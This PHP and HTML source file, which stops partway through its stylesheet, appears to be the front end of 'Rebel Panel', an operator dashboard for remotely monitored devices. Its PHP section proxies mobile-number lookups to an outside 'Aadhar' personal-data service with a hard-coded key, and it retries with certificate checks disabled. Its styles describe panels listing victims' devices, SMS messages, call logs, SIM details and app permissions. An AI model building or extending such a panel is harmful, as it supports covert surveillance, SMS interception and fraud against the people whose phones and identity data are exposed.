<?php
if (isset($_GET['aadhar_api']) || isset($_GET['rbl_aadhar']) || isset($_POST['aadhar_api']) || isset($_POST['rbl_aadhar'])) {
  header('Content-Type: application/json; charset=UTF-8');
  header('Cache-Control: no-store');
  $num = preg_replace('/\D/', '', isset($_REQUEST['num']) ? $_REQUEST['num'] : '');
  if (strlen($num) > 10) $num = substr($num, -10);
  if (strlen($num) < 10) {
    http_response_code(400);
    echo json_encode(['error' => 'Valid 10-digit mobile number required']);
    exit;
  }
  $url = 'https://anon-num-info.vercel.app/num?key=305temp&num=' . rawurlencode($num);
  $raw = false; $code = 0; $detail = '';
  $fetch = function($verify) use ($url, &$raw, &$code, &$detail) {
    if (function_exists('curl_init')) {
      $ch = curl_init($url);
      curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 35,
        CURLOPT_SSL_VERIFYPEER => $verify,
        CURLOPT_SSL_VERIFYHOST => $verify ? 2 : 0,
        CURLOPT_HTTPHEADER => ['Accept: application/json', 'User-Agent: RebelPanel/1.0']
      ]);
      $raw = curl_exec($ch);
      $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
      $detail = curl_error($ch);
      curl_close($ch);
      return;
    }
    $ctx = stream_context_create([
      'http' => ['timeout' => 35, 'ignore_errors' => true, 'header' => "Accept: application/json\r\nUser-Agent: RebelPanel/1.0\r\n"],
      'ssl' => ['verify_peer' => $verify, 'verify_peer_name' => $verify]
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    $code = 0;
    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) $code = (int)$m[1];
    if (!$code && $raw !== false) $code = 200;
    if ($raw === false) $detail = 'file_get_contents failed';
  };
  foreach ([true, false] as $verify) {
    $fetch($verify);
    if ($raw !== false && $code >= 200 && $code < 300) { echo $raw; exit; }
  }
  http_response_code(502);
  echo json_encode(['error' => 'Upstream Aadhar API unreachable', 'detail' => $detail]);
  exit;
}
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Rebel Panel — Real-Time Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
  <style>
    :root{--bg:#050508;--surface:#0d0d14;--card:#12121c;--border:#2a2a3a;--accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;--success:#00ff9d;--error:#ff4466;--glow:rgba(255,60,60,0.45);--icon-glow:rgba(255,60,60,0.7)}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
    #bg3d{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
    #particleCanvas{position:absolute;inset:0;width:100%;height:100%;opacity:0.55}
    .orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:0.35;animation:orbFloat 12s ease-in-out infinite}
    .orb1{width:420px;height:420px;background:radial-gradient(circle,#ff3c3c,transparent 70%);top:-10%;left:-5%;animation-delay:0s}
    .orb2{width:380px;height:380px;background:radial-gradient(circle,#ff9500,transparent 70%);bottom:-15%;right:-8%;animation-delay:-4s}
    .orb3{width:300px;height:300px;background:radial-gradient(circle,#7b2fff,transparent 70%);top:40%;left:55%;animation-delay:-7s;opacity:0.2}
    @keyframes orbFloat{0%,100%{transform:translate3d(0,0,0) scale(1)}50%{transform:translate3d(30px,-25px,50px) scale(1.08)}}
    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.04) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
    .wrapper{position:relative;z-index:1}

    /* ─── 3D GLOWING ICONS (icons only — layout stays flat) ─── */
    .i3d{display:inline-block;position:relative;font-style:normal;line-height:1;vertical-align:middle;transform-style:preserve-3d;transform:perspective(400px) rotateX(12deg) translateZ(0);filter:drop-shadow(0 3px 4px rgba(0,0,0,0.55)) drop-shadow(0 0 10px var(--icon-glow));text-shadow:0 1px 0 rgba(255,255,255,0.45),0 4px 8px rgba(0,0,0,0.65),0 0 14px var(--icon-glow),0 0 28px var(--icon-glow);animation:iconFloat 4.2s ease-in-out infinite,iconShine 3.6s ease-in-out infinite;will-change:transform,filter}
    .i3d-sm{font-size:0.95em}
    .i3d-lg{font-size:1.55em}
    .i3d-xl{font-size:2.8em}
    .i3d-fire{--icon-glow:rgba(255,120,40,0.85)}
    .i3d-red{--icon-glow:rgba(255,60,60,0.8)}
    .i3d-green{--icon-glow:rgba(0,255,157,0.75)}
    .i3d-blue{--icon-glow:rgba(80,160,255,0.8)}
    .i3d-purple{--icon-glow:rgba(160,90,255,0.8)}
    .i3d-orange{--icon-glow:rgba(255,149,0,0.85)}
    .i3d-static{animation:none}
    .logo-icon-3d{filter:drop-shadow(0 0 8px rgba(255,60,60,0.7)) drop-shadow(0 4px 12px rgba(0,0,0,0.5));animation:logoFloat 4.5s ease-in-out infinite,logoShine 3.8s ease-in-out infinite;will-change:transform,filter}
    @keyframes iconFloat{0%,100%{transform:perspective(400px) rotateX(12deg) translateY(0) scale(1)}50%{transform:perspective(400px) rotateX(14deg) translateY(-3px) scale(1.03)}}
    @keyframes iconShine{0%,100%{filter:drop-shadow(0 3px 4px rgba(0,0,0,0.55)) drop-shadow(0 0 8px var(--icon-glow))}50%{filter:drop-shadow(0 4px 6px rgba(0,0,0,0.5)) drop-shadow(0 0 14px var(--icon-glow)) drop-shadow(0 0 22px var(--icon-glow))}}
    @keyframes logoFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-2px)}}
    @keyframes logoShine{0%,100%{filter:drop-shadow(0 0 6px rgba(255,60,60,0.55)) drop-shadow(0 3px 8px rgba(0,0,0,0.4))}50%{filter:drop-shadow(0 0 12px rgba(255,60,60,0.85)) drop-shadow(0 0 20px rgba(255,60,60,0.35)) drop-shadow(0 4px 10px rgba(0,0,0,0.45))}}
    .data-tab .i3d{font-size:13px;margin-right:3px}
    .btn .i3d,.btn-sm .i3d,.btn-fb .i3d{margin-right:5px}
    .dchip .i3d{font-size:9px;margin-right:2px;animation-duration:4.8s,4.2s}

    /* ─── EMOJI CONTEXT ANIMATIONS ─── */
    .i3d-swap{display:inline-block;position:relative;width:1.15em;height:1.15em;vertical-align:middle}
    .i3d-swap .em-a,.i3d-swap .em-b{position:absolute;left:0;top:0;width:100%;text-align:center;line-height:1;font-style:normal}
    .i3d-swap .em-a{animation:swapShow 2.6s ease-in-out infinite}
    .i3d-swap .em-b{animation:swapHide 2.6s ease-in-out infinite}
    @keyframes swapShow{0%,46%{opacity:1;transform:scale(1) rotate(0deg)}50%,96%{opacity:0;transform:scale(0.75) rotate(-10deg)}100%{opacity:1;transform:scale(1) rotate(0deg)}}
    @keyframes swapHide{0%,46%{opacity:0;transform:scale(0.75) rotate(10deg)}50%,96%{opacity:1;transform:scale(1) rotate(0deg)}100%{opacity:0;transform:scale(0.75) rotate(10deg)}}
    .i3d-anim{display:inline-block;position:relative;vertical-align:middle}
    .i3d-anim .em-a{display:inline-block;font-style:normal;line-height:1}
    .i3d-anim-ring .em-a{animation:phoneRing 1.4s ease-in-out infinite}
    @keyframes phoneRing{0%,100%{transform:rotate(0)}12%{transform:rotate(-14deg)}24%{transform:rotate(14deg)}36%{transform:rotate(-10deg)}48%{transform:rotate(10deg)}60%{transform:rotate(-5deg)}72%{transform:rotate(0)}}
    .i3d-anim-bounce .em-a{animation:emojiBounce 2s ease-in-out infinite}
    @keyframes emojiBounce{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-4px) scale(1.08)}}
    .i3d-anim-pulse .em-a{animation:emojiPulse 2.2s ease-in-out infinite}
    @keyframes emojiPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.14)}}
    .i3d-anim-send .em-a{animation:emojiSend 2s ease-in-out infinite}
    @keyframes emojiSend{0%,100%{transform:translate(0,0)}40%{transform:translate(2px,-5px)}60%{transform:translate(1px,-3px)}}
    .i3d-anim-forward .em-a{animation:emojiForward 2.2s ease-in-out infinite}
    @keyframes emojiForward{0%,100%{transform:translate(0,0)}50%{transform:translate(4px,-4px)}}
    .i3d-anim-fire .em-a{animation:emojiFire 1.6s ease-in-out infinite}
    @keyframes emojiFire{0%,100%{transform:scale(1) translateY(0)}35%{transform:scale(1.1) translateY(-2px)}70%{transform:scale(0.95) translateY(1px)}}
    .i3d-anim-robot .em-a{animation:emojiRobot 2.5s ease-in-out infinite}
    @keyframes emojiRobot{0%,100%{transform:rotate(0)}25%{transform:rotate(-6deg)}75%{transform:rotate(6deg)}}
    .i3d-anim-spin .em-a{animation:emojiSpin 2.8s linear infinite}
    @keyframes emojiSpin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
    .i3d-anim-bolt .em-a{animation:emojiBolt 1.8s ease-in-out infinite}
    @keyframes emojiBolt{0%,100%{opacity:1;filter:brightness(1)}50%{opacity:1;filter:brightness(1.45) drop-shadow(0 0 6px rgba(255,200,0,0.8))}}
    @media (prefers-reduced-motion:reduce){
      .i3d,.logo-icon-3d,.orb,.i3d-anim .em-a,.i3d-swap .em-a,.i3d-swap .em-b{animation:none!important}
      #particleCanvas{opacity:0.15}
    }
    @media (max-width:900px){
      #particleCanvas{opacity:0.22}
      .orb{opacity:0.18}
    }

    /* ─── LOGIN ─── */
    #loginPage{position:fixed;inset:0;z-index:9999;background:rgba(5,5,8,0.88);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px}
    #loginPage.hidden{display:none!important}
    .login-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(12,12,18,0.98));border:1px solid rgba(255,60,60,0.2);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 40px var(--glow),inset 0 1px 0 rgba(255,255,255,0.06);transition:box-shadow 0.35s ease}
    .login-card:hover{box-shadow:0 40px 100px rgba(0,0,0,0.8),0 0 60px var(--glow)}
    .login-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:22px 0 0 22px}
    .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:28px}
    .login-logo .rebel{font-size:24px;font-weight:800;letter-spacing:-1px}
    .login-logo .rebel em{font-style:normal;color:var(--accent)}
    .login-logo .panel-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:2px}
    .login-card h2{font-size:20px;font-weight:800;margin-bottom:4px}
    .login-card h2 span{color:var(--accent)}
    .login-card .login-sub{color:var(--muted);font-size:12px;margin-bottom:24px}
    .login-error{background:rgba(255,68,102,0.1);border:1px solid rgba(255,68,102,0.3);color:var(--error);border-radius:8px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:11px;margin-bottom:14px;display:none}
    .remember-row{display:flex;align-items:center;gap:10px;margin:14px 0 18px}
    .remember-row input[type=checkbox]{width:16px;height:16px;accent-color:var(--accent);cursor:pointer}
    .remember-row label{font-size:11px;color:var(--muted);cursor:pointer}
    .login-hint{margin-top:16px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    label{font-size:9px;font-family:'Space Mono',monospace;color:var(--muted);letter-spacing:1.5px;display:block;margin-bottom:5px;text-transform:uppercase}
    input,textarea{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:13px;outline:none;transition:border-color 0.2s}
    input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.1)}
    .btn{width:100%;padding:13px;border-radius:10px;border:none;background:linear-gradient(135deg,var(--accent) 0%,#cc0000 100%);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;text-transform:uppercase}
    .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,60,60,0.4)}
    .btn-sm{padding:10px 22px;border-radius:8px;border:none;background:linear-gradient(135deg,var(--accent),#cc0000);color:#fff;font-family:'Syne',sans-serif;font-weight:700;font-size:13px;cursor:pointer;transition:all 0.2s;width:auto}
    .btn-sm:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(255,60,60,0.4)}

    /* ─── HEADER ─── */
    header{padding:16px 28px;border-bottom:1px solid rgba(255,60,60,0.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:linear-gradient(180deg,rgba(14,14,22,0.92),rgba(8,8,12,0.88));backdrop-filter:blur(20px);position:sticky;top:0;z-index:100;box-shadow:0 8px 32px rgba(0,0,0,0.5),inset 0 -1px 0 rgba(255,60,60,0.1)}
    .logo{display:flex;align-items:center;gap:12px}
    .logo-mark{width:34px;height:34px}
    .logo-text .rebel{font-size:20px;font-weight:800;letter-spacing:-1px;line-height:1}
    .logo-text .rebel em{font-style:normal;color:var(--accent)}
    .logo-text .panel-sub{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:3px}
    .status-pill{display:flex;align-items:center;gap:8px;padding:5px 14px;border-radius:100px;border:1px solid var(--border);font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);transition:all 0.3s}
    .status-pill.connected{border-color:var(--success);color:var(--success)}
    .status-pill .status-dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
    .status-pill.connected .status-dot{background:var(--success);box-shadow:0 0 6px var(--success);animation:softPulse 2.4s ease-in-out infinite}
    @keyframes softPulse{0%,100%{box-shadow:0 0 4px var(--success);opacity:1;transform:scale(1)}50%{box-shadow:0 0 10px var(--success),0 0 16px rgba(0,255,157,0.35);opacity:1;transform:scale(1.15)}}

    /* ─── LAYOUT ─── */
    .main-layout{display:flex;min-height:calc(100vh - 65px)}
    .hidden{display:none!important}

    /* ─── FIREBASE SWITCHER ─── */
    .fb-switcher{padding:10px 12px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:8px;background:linear-gradient(180deg,rgba(255,60,60,0.04),transparent)}
    .fb-switch-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
    .fb-switch-tabs{display:flex;flex-wrap:wrap;gap:6px}
    .fb-tab{padding:8px 12px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s;position:relative;overflow:hidden}
    .fb-tab::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,60,60,0.15),transparent);opacity:0;transition:opacity 0.25s}
    .fb-tab:hover{border-color:rgba(255,60,60,0.4);color:var(--text);transform:translateY(-1px);box-shadow:0 4px 16px rgba(255,60,60,0.12)}
    .fb-tab.active{border-color:var(--accent);color:#fff;background:linear-gradient(135deg,rgba(255,60,60,0.25),rgba(180,0,0,0.15));box-shadow:0 0 20px var(--glow),0 6px 20px rgba(0,0,0,0.35)}
    .fb-tab.active::before{opacity:1}
    .fb-tab-count{display:block;font-size:7px;opacity:0.7;margin-top:2px}

    /* ─── SIDEBAR ─── */
    .sidebar{width:280px;flex-shrink:0;border-right:1px solid rgba(255,60,60,0.12);background:linear-gradient(180deg,rgba(12,12,18,0.92),rgba(8,8,12,0.95));height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column;box-shadow:4px 0 24px rgba(0,0,0,0.35)}
    .sidebar::-webkit-scrollbar{width:3px}
    .sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
    .sidebar-hdr{padding:14px 16px 10px;border-bottom:1px solid var(--border)}
    .sidebar-title{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px}
    .sidebar-stats{display:flex;gap:6px}
    .mini-stat{flex:1;background:linear-gradient(145deg,rgba(18,18,26,0.95),rgba(12,12,18,0.9));border:1px solid var(--border);border-radius:10px;padding:8px;text-align:center;box-shadow:0 4px 16px rgba(0,0,0,0.3);transition:box-shadow 0.2s,border-color 0.2s}
    .mini-stat:hover{border-color:rgba(255,60,60,0.25);box-shadow:0 4px 20px rgba(255,60,60,0.08)}
    .mini-val{font-size:20px;font-weight:800;line-height:1}
    .mini-val.t{color:var(--accent)}
    .mini-val.on{color:var(--success)}
    .mini-val.off{color:var(--muted)}
    .mini-lbl{font-family:'Space Mono',monospace;font-size:7px;color:var(--muted);letter-spacing:1px;margin-top:3px}
    .sidebar-search{padding:10px 12px;border-bottom:1px solid var(--border)}
    .sidebar-search input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:7px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;outline:none}
    .sidebar-search input:focus{border-color:var(--accent)}
    .dev-list{flex:1;padding:8px}
    .dev-item{padding:12px;border:1px solid var(--border);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:transform 0.2s ease,box-shadow 0.2s,border-color 0.2s;background:linear-gradient(145deg,rgba(20,20,28,0.9),rgba(14,14,20,0.95));position:relative;overflow:hidden}
    .dev-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--muted);border-radius:12px 0 0 12px;transition:all 0.2s}
    .dev-item::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.03),transparent);pointer-events:none;border-radius:12px}
    .dev-item:hover{border-color:rgba(255,60,60,0.4);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,0.4),0 0 16px rgba(255,60,60,0.08)}
    .dev-item:hover::before{background:var(--accent);box-shadow:0 0 12px var(--accent)}
    .dev-item.active{border-color:var(--accent);background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,28,0.95));box-shadow:0 0 24px var(--glow),0 8px 28px rgba(0,0,0,0.45)}
    .dev-item.active::before{background:var(--accent);box-shadow:0 0 12px var(--accent)}
    .dev-item.is-online::before{background:var(--success)}
    .dev-item.is-online.active::before{background:var(--success);box-shadow:0 0 8px rgba(0,255,157,0.5)}
    .dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
    .dev-name{font-weight:700;font-size:13px}
    .dev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
    .dev-dot.online{background:var(--success);box-shadow:0 0 5px var(--success);animation:softPulse 2.4s ease-in-out infinite}
    .dev-dot.offline{background:var(--muted)}
    .dev-uid{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:6px}
    .dev-chips{display:flex;gap:5px;flex-wrap:wrap}
    .dchip{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);background:var(--bg);padding:2px 7px;border-radius:20px;border:1px solid var(--border)}
    .dchip.bat-hi{color:var(--success);border-color:rgba(0,255,157,0.2)}
    .dchip.bat-md{color:var(--accent2);border-color:rgba(255,149,0,0.2)}
    .dchip.bat-lo{color:var(--error);border-color:rgba(255,68,102,0.2)}
    .dev-empty{text-align:center;padding:30px 14px;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px}
    .cache-badge{font-family:'Space Mono',monospace;font-size:7px;color:var(--accent2);padding:2px 6px;border:1px solid rgba(255,149,0,0.25);border-radius:6px;margin-left:6px}
    .fetch-ms{font-family:'Space Mono',monospace;font-size:8px;color:var(--success);margin-left:4px}
    .hdr-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
    .btn-fb{padding:7px 14px;border-radius:100px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s}
    .btn-fb:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 4px 16px rgba(255,60,60,0.15)}
    .btn-switch{border-color:rgba(255,149,0,0.35);background:linear-gradient(135deg,rgba(255,149,0,0.12),rgba(255,60,60,0.08));min-width:130px}
    .fb-dropdown-wrap{position:relative}
    .fb-drop-menu{position:absolute;top:calc(100% + 8px);right:0;min-width:200px;background:linear-gradient(145deg,rgba(18,18,26,0.98),rgba(10,10,15,0.99));border:1px solid rgba(255,60,60,0.25);border-radius:12px;padding:8px;box-shadow:0 20px 50px rgba(0,0,0,0.6),0 0 30px var(--glow);z-index:200}
    .fb-drop-item{display:block;width:100%;text-align:left;padding:10px 12px;border:none;border-radius:8px;background:transparent;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;cursor:pointer;transition:all 0.2s}
    .fb-drop-item:hover{background:rgba(255,60,60,0.1)}
    .fb-drop-item.active{background:rgba(255,60,60,0.2);color:var(--accent)}
    .fb-chip{font-size:7px;padding:1px 6px;border-radius:8px;background:rgba(255,149,0,0.12);border:1px solid rgba(255,149,0,0.25);color:var(--accent2);margin-left:4px}
    .fb-list{margin:12px 0;max-height:200px;overflow-y:auto}
    .fb-item{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:10px 12px;border:1px solid var(--border);border-radius:10px;margin-bottom:8px;background:var(--surface)}
    .fb-item-name{font-weight:700;font-size:12px}
    .fb-item-url{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);word-break:break-all;margin-top:3px}
    .fb-item-nodes{font-family:'Space Mono',monospace;font-size:8px;color:var(--accent2);margin-top:4px}
    .fb-del{background:transparent;border:1px solid rgba(255,68,102,0.3);color:var(--error);border-radius:6px;padding:4px 10px;font-size:10px;cursor:pointer}
    .fb-del:hover{background:rgba(255,68,102,0.1)}
    .modal-wide{max-width:560px}

    /* ─── MAIN AREA ─── */
    .main-area{flex:1;overflow-x:hidden}
    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;opacity:0.55}
    .empty-icon{font-size:52px}
    .empty-txt{font-family:'Space Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px}

    /* ─── DEVICE DETAIL ─── */
    .dev-hero{padding:22px 28px;border-bottom:1px solid rgba(255,60,60,0.15);background:linear-gradient(135deg,rgba(255,60,60,0.08) 0%,transparent 60%);position:relative;overflow:hidden;box-shadow:inset 0 -20px 60px rgba(255,60,60,0.03)}
    .dev-hero::after{content:'';position:absolute;top:-40%;right:-5%;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(255,60,60,0.05),transparent 70%);pointer-events:none}
    .hero-top{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px}
    .hero-name{font-size:22px;font-weight:800}
    .hero-brand{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px}
    .hero-id{font-family:'Space Mono',monospace;font-size:8px;color:var(--accent);margin-top:4px;letter-spacing:1px}
    .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:20px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700;letter-spacing:1px}
    .hero-badge.online{background:rgba(0,255,157,0.1);border:1px solid rgba(0,255,157,0.25);color:var(--success)}
    .hero-badge.online::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--success);animation:softPulse 2.4s ease-in-out infinite}
    .hero-badge.offline{background:rgba(107,107,136,0.1);border:1px solid rgba(107,107,136,0.2);color:var(--muted)}
    .hero-badge.offline::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--muted)}
    .hero-metrics{display:flex;gap:20px;flex-wrap:wrap}
    .hm{display:flex;flex-direction:column;gap:3px}
    .hm-lbl{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px}
    .hm-val{font-size:14px;font-weight:800;color:var(--accent)}
    .hm-val.green{color:var(--success)}
    .hm-val.orange{color:var(--accent2)}

    /* ─── DATA TABS ─── */
    .data-tabs{display:flex;gap:0;padding:0 28px;border-bottom:1px solid var(--border);background:rgba(10,10,15,0.7);overflow-x:auto}
    .data-tab{padding:11px 14px;border:none;background:transparent;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;white-space:nowrap;display:flex;align-items:center;gap:5px;flex-shrink:0}
    .data-tab:hover{color:var(--text)}
    .data-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
    .tab-badge{background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.3);color:var(--accent);padding:1px 6px;border-radius:8px;font-size:8px}
    .data-section{padding:22px 28px 50px;display:none}
    .data-section.active{display:block}

    /* ─── TABLES ─── */
    .realtime-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:100px;background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2)}
    .rt-dot{width:5px;height:5px;border-radius:50%;background:var(--accent2);animation:softPulseOrange 2.2s ease-in-out infinite}
    @keyframes softPulseOrange{0%,100%{box-shadow:0 0 3px var(--accent2);opacity:1;transform:scale(1)}50%{box-shadow:0 0 8px var(--accent2),0 0 14px rgba(255,149,0,0.35);opacity:1;transform:scale(1.12)}}
    .sec-title{font-size:22px;font-weight:800;margin-bottom:4px}
    .sec-title span{color:var(--accent)}
    .dm-toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
    .dm-search{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none;width:100%;max-width:280px}
    .dm-search:focus{border-color:var(--accent)}
    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto;box-shadow:0 8px 32px rgba(0,0,0,0.35)}
    .tbl{width:100%;border-collapse:collapse;min-width:450px}
    .tbl thead tr{background:rgba(255,60,60,0.05)}
    .tbl th{padding:10px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
    .tbl tbody tr{border-bottom:1px solid rgba(42,42,58,0.4);transition:background 0.1s}
    .tbl tbody tr:last-child{border-bottom:none}
    .tbl tbody tr:hover{background:rgba(255,255,255,0.015)}
    .tbl td{padding:10px 14px;font-size:12px;vertical-align:middle}
    .mono{font-family:'Space Mono',monospace;font-size:9px}
    .tbl-empty{text-align:center;padding:36px;color:var(--muted);font-size:12px}
    .sbadge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:14px;font-family:'Space Mono',monospace;font-size:8px;font-weight:700}
    .sbadge.inbox,.sbadge.incoming{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
    .sbadge.sent,.sbadge.outgoing{background:rgba(255,149,0,0.1);color:var(--accent2);border:1px solid rgba(255,149,0,0.2)}
    .sbadge.missed,.sbadge.offline{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}
    .sbadge.granted{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
    .sbadge.denied{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}

    /* ─── SIM CARDS ─── */
    .sim-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:12px}
    .sim-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden}
    .sim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
    .sim-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid rgba(42,42,58,0.4);gap:8px}
    .sim-row:last-child{border-bottom:none}
    .sim-key{font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2);min-width:100px}
    .sim-val{font-family:'Space Mono',monospace;font-size:10px;color:var(--text);text-align:right;word-break:break-all;max-width:55%}

    /* ─── PERMS GRID ─── */
    .perm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
    .perm-item{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:11px 14px;display:flex;align-items:center;justify-content:space-between;gap:8px}
    .perm-name{font-family:'Space Mono',monospace;font-size:9px;color:var(--text);letter-spacing:0.5px;text-transform:uppercase}

    /* ─── FORM ─── */
    .config-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(14,14,20,0.98));border:1px solid rgba(255,60,60,0.15);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0;box-shadow:0 12px 40px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.04)}
    .config-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
    .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
    textarea{resize:vertical;min-height:80px}

    /* ─── TOAST ─── */
    .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
    .toast{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--text);display:flex;align-items:center;gap:10px;min-width:220px;animation:toastIn 0.25s ease;box-shadow:0 6px 24px rgba(0,0,0,0.4)}
    .toast.success{border-color:rgba(0,255,157,0.3)}
    .toast.error{border-color:rgba(255,68,102,0.3)}
